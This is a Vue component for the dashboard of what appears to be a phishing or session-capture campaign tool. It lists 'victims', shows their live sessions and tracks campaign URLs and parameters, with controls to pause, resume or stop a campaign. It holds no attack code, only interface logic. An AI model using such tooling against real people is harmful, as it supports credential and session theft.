<script setup>
import { ref, computed, onMounted, onUnmounted, watch } from 'vue'
import { useRoute, useRouter } from 'vue-router'
import { useToast } from 'primevue/usetoast'
import { backendService } from '@/services/backend'

import CampaignHeader from '@/components/campaign/dashboard/CampaignHeader.vue'
import CampaignFunnel from '@/components/campaign/dashboard/CampaignFunnel.vue'
import LiveSessionsPreview from '@/components/campaign/dashboard/LiveSessionsPreview.vue'
import VictimsTable from '@/components/campaign/dashboard/VictimsTable.vue'
import StopCampaignDialog from '@/components/campaign/StopCampaignDialog.vue'

import Breadcrumb from 'primevue/breadcrumb'
import { useVisibilityPolling } from '@/composables/useVisibilityPolling'
import { useDelayedIndicator } from '@/composables/useDelayedIndicator'
import DelayedContent from '@/components/default/DelayedContent.vue'

const route = useRoute()
const router = useRouter()
const toast = useToast()

const campaignId = computed(() => route.params.campaignId)
const campaign = ref(null)
const victims = ref([])
const loading = ref(true)
const showLoading = useDelayedIndicator(loading)
const refreshErrorNotified = ref(false)
let pageRequestController = null

const stopDialogVisible = ref(false)
const stopping = ref(false)
const runtimeAction = ref(null)

// Breadcrumb
const breadcrumbItems = computed(() => [
    { label: 'Campaigns', route: '/campaigns' },
    { label: campaign.value?.name || 'Loading...' }
])

const breadcrumbHome = { icon: 'pi pi-home', route: '/' }

// Computed
const activeVictims = computed(() =>
    campaign.value?.status === 'active'
        ? victims.value.filter(v => Boolean(v.is_active) === true)
        : []
)

async function loadDashboard(showLoading = true, signal) {
    if (showLoading) loading.value = true

    try {
        const requestedCampaignId = campaignId.value
        const [nextCampaign, nextVictims] = await Promise.all([
            backendService.getCampaign(requestedCampaignId, { signal }),
            backendService.getCampaignVictims(requestedCampaignId, { signal })
        ])
        if (requestedCampaignId !== campaignId.value) return

        campaign.value = nextCampaign
        victims.value = Array.isArray(nextVictims) ? nextVictims : []
        refreshErrorNotified.value = false
    } catch (error) {
        if (error?.name === 'AbortError') return
        if (showLoading) {
            campaign.value = null
        }
        if (showLoading || !refreshErrorNotified.value) {
            toast.add({
                severity: 'error',
                summary: showLoading ? 'Campaign unavailable' : 'Refresh failed',
                detail: 'Failed to load campaign: ' + error.message,
                life: 3000
            })
            refreshErrorNotified.value = true
        }
    } finally {
        if (showLoading) loading.value = false
    }
}

// Methods
function goBack() {
    router.push('/campaigns')
}

function openStopDialog() {
    stopDialogVisible.value = true
}

async function confirmStopCampaign() {
    stopping.value = true
    try {
        await backendService.stopCampaign(campaignId.value)
        toast.add({
            severity: 'success',
            summary: 'Stopped',
            detail: 'Campaign has been stopped',
            life: 2000
        })
        await loadDashboard(false)
    } catch (error) {
        toast.add({
            severity: 'error',
            summary: 'Error',
            detail: error.message,
            life: 3000
        })
    } finally {
        stopping.value = false
        stopDialogVisible.value = false
    }
}

async function changeCampaignRuntime(action) {
    if (runtimeAction.value) return
    runtimeAction.value = action
    try {
        if (action === 'pause') {
            await backendService.pauseCampaign(campaignId.value)
        } else {
            await backendService.resumeCampaign(campaignId.value)
        }
        await loadDashboard(false)
        toast.add({
            severity: 'success',
            summary: action === 'pause' ? 'Paused' : 'Resumed',
            detail: `Campaign has been ${action === 'pause' ? 'paused' : 'resumed'}`,
            life: 2000
        })
    } catch (error) {
        toast.add({
            severity: 'error',
            summary: `${action === 'pause' ? 'Pause' : 'Resume'} failed`,
            detail: error.message,
            life: 3000
        })
    } finally {
        runtimeAction.value = null
    }
}

function openVictim(victim) {
    router.push({
        name: 'victim',
        params: {
            campaignId: campaignId.value,
            victimId: victim.id
        }
    })
}

onMounted(() => {
    pageRequestController = new AbortController()
    loadDashboard(true, pageRequestController.signal)
})

watch(campaignId, () => {
    pageRequestController?.abort()
    pageRequestController = new AbortController()
    campaign.value = null
    victims.value = []
    loadDashboard(true, pageRequestController.signal)
})

useVisibilityPolling(
    (signal) => loadDashboard(false, signal),
    {
        intervalMs: 30000,
        enabled: () => !loading.value,
        immediate: false
    }
)

onUnmounted(() => {
    pageRequestController?.abort()
})
</script>

<template>
    <div class="campaign-dashboard app-page">
        <DelayedContent :loading="loading" :show-indicator="showLoading">
        <!-- Breadcrumb -->
        <Breadcrumb
            :home="breadcrumbHome"
            :model="breadcrumbItems"
            class="dashboard-breadcrumb"
        >
            <template #item="{ item }">
                <router-link v-if="item.route" :to="item.route" class="breadcrumb-link">
                    {{ item.label }}
                </router-link>
                <span v-else>{{ item.label }}</span>
            </template>
        </Breadcrumb>

        <!-- Campaign Content -->
        <div v-if="campaign" class="dashboard-content">
            <!-- Header -->
            <CampaignHeader
                :campaign="campaign"
                :victims="victims"
                :runtime-action="runtimeAction"
                @back="goBack"
                @pause="changeCampaignRuntime('pause')"
                @resume="changeCampaignRuntime('resume')"
                @stop="openStopDialog"
            />

            <!-- Funnel Metrics -->
            <CampaignFunnel v-if="campaign.campaign_type !== 'standalone'" :campaign="campaign" />

            <!-- Live Sessions Preview -->
            <LiveSessionsPreview
                v-if="activeVictims.length > 0"
                :victims="activeVictims"
                @select="openVictim"
            />

            <!-- Victims Table -->
            <VictimsTable
                :victims="victims"
                :campaignId="campaignId"
                :campaignType="campaign.campaign_type"
                :campaignPublicUrl="campaign.public_url"
                :campaignEntryPath="campaign.advanced_options?.routes
                    ? (campaign.advanced_options.routes.entry_path || '')
                    : 'continue'"
                :campaignTrackingParameter="campaign.advanced_options?.routes?.tracking_parameter || ''"
                @select="openVictim"
            />
        </div>

        <!-- Error State -->
        <div v-else class="error-state">
            <i class="pi pi-exclamation-circle"></i>
            <h2>Campaign not found</h2>
            <Button label="Go Back" icon="pi pi-arrow-left" @click="goBack" />
        </div>
        </DelayedContent>

        <!-- ✅ Stop Campaign Dialog -->
        <StopCampaignDialog
            :visible="stopDialogVisible"
            :campaignName="campaign?.name"
            :stopping="stopping"
            @update:visible="stopDialogVisible = $event"
            @cancel="stopDialogVisible = false"
            @confirm="confirmStopCampaign"
        />
    </div>
</template>

<style scoped>
.campaign-dashboard {
    padding: var(--page-padding);
    background-color: var(--color-background);
}

.dashboard-breadcrumb {
    margin-bottom: 1.5rem;
    background: transparent;
    border: none;
    padding: 0;
}

.breadcrumb-link {
    color: var(--color-text-mute);
    text-decoration: none;
    transition: color 0.2s;
}

.breadcrumb-link:hover {
    color: var(--color-accent);
}

.dashboard-content {
    display: flex;
    flex-direction: column;
    gap: 1.5rem;
}

/* Loading State */
.loading-state {
    display: flex;
    flex-direction: column;
    gap: 1.5rem;
}

/* Error State */
.error-state {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 5rem 2rem;
    text-align: center;
    gap: 1rem;
}

.error-state i {
    font-size: 4rem;
    color: var(--color-text-mute);
}

.error-state h2 {
    font-size: 1.5rem;
    color: var(--color-heading);
    margin: 0;
}

/* ✅ Stop Dialog */
.stop-dialog :deep(.p-dialog-header) {
    background-color: var(--color-background-soft);
    border-color: var(--color-border);
}

.stop-dialog :deep(.p-dialog-content) {
    padding: 1.5rem;
}

.dialog-content {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 1rem;
    text-align: center;
}

.dialog-content i {
    font-size: 2.5rem;
    color: var(--warning);
}

.dialog-content p {
    margin: 0;
    color: var(--color-text);
    font-size: 0.95rem;
}

.warning-text {
    color: var(--color-text-mute);
    font-size: 0.85rem !important;
}

.stop-dialog :deep(.p-dialog-footer) {
    background-color: var(--color-background-soft);
    border-color: var(--color-border);
    padding: 1rem;
    display: flex;
    gap: 0.75rem;
    justify-content: flex-end;
}

/* Responsive */
@media (max-width: 768px) {
    .campaign-dashboard {
        padding: 1rem;
    }

    .dialog-content i {
        font-size: 2rem;
    }

    .stop-dialog :deep(.p-dialog-footer) {
        flex-direction: column;
    }

    .stop-dialog :deep(.p-dialog-footer button) {
        width: 100%;
    }
}
</style>
